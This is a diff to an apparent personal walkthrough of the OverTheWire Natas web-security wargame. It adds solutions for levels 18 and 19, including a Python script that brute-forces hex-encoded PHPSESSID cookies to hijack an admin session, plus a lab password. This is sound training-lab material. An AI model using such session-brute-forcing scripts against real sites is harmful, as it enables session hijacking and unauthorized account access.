@@ -88,8 +88,33 @@ while len(password) != 32:
 			break
 print("password: ",password)
 ```
-<br>
+<br><br>
 ->Natas18<br>
+"https://stackoverflow.com/questions/1370951/what-is-phpsessid" ```PHP uses one of two methods to keep track of sessions. If cookies are enabled, like in your case, it uses them.``` ig hint is maxid = 640. so just loop through PHPSESSID from 1 to 640 using py script or burpsuite intruder. i used burpsuite sniper attack.<br><br>
+->Natas19<br>
+```
+import requests ```
+username = 'natas19'
+pwd = 'tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr'
+url = 'http://natas19.natas.labs.overthewire.org/'
+#start a session
+session = requests.Session()
+#the cookie that i got is the hex form of "80-admin"-'38302d61646d696e', so try replacing 80
+for x in range(1,641):
+    string = (f"{x}"+"-admin").encode('utf-8')
+    payload = string.hex()
+    print(payload)
+    response = session.get(url,cookies={'PHPSESSID':payload}, auth=(username,pwd))
+    content = response.text
+    if "You are an admin" in content:
+        print("yello", x)
+        break
+    else:
+        print ("tried: ", x)
+
+```
+<br><br>
+->Natas20<br>
 
 
 
